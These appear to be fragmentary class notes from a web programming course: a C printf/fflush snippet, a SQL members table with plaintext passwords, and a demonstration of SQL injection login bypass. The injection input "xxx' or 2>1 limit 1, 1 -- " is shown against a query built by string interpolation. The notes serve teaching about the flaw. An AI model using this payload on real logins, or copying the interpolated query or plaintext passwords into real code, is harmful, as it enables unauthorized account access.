Readme dafd

https://github.com/eurekasolution/kpc2410

http://localhost



main()
{
    a();
    printf("a");
    b();
    printf("b");
    c();
    printf("c");
    fflush(stdout); // ob.flush()
    d();
    printf("d");
     fflush(stdout);
    e();
    printf("e");
     fflush(stdout);
}

a
b

create table members (
    idx integer auto_increment primary key,
    id  varchar(20) unique,
    pass varchar(50),
    name varchar(20)
);

insert into members (id, pass, name) values ('test', '1111', '테스트');
insert into members (id, pass, name) values ('admin', '1111', '관리자');


$id : test
$pass : 1234

select * from members where id='test' and pass='1234'
id : xxx' or 2>1 limit 1, 1 -- 
$sql = "select * from members where id='$id' and pass='$pass' ";
$sql = "select * from members where id='xxx' or 2>1 -- ' and pass='$pass' ";